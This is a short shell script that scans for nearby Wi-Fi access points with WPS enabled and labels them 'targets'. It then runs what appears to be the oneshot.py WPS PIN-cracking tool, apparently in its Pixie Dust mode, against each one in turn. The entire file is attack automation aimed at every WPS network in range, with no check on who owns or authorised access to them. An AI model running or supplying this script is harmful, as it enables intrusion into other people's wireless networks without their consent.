#!/bin/sh

if [ "$1" ]
then
	IFACE=$1
else
	IFACE="wlan0"
fi

echo "Scanning networks around..."

TARGETS=$(iw dev $IFACE scan |\
awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC};\
                        $1 == "SSID:" {wifi[MAC]["SSID"] = $2};\
                        $1 == "WPS:" {printf "%s\t%s\n",wifi[MAC]["BSSID"],wifi[MAC]["SSID"]}'|\
sed --expression='s/(on//g')

if [ "$TARGETS" ]
then
	echo "Found targets:"
	echo "$TARGETS"
else
	echo "No targets found"
	exit
fi

TARGETS_BSSIDS=$(echo $TARGETS | awk '{print $1}')

for TARGET in $TARGETS_BSSIDS
do
	python3 oneshot.py --bssid $TARGET -K -F -i $IFACE -w
done
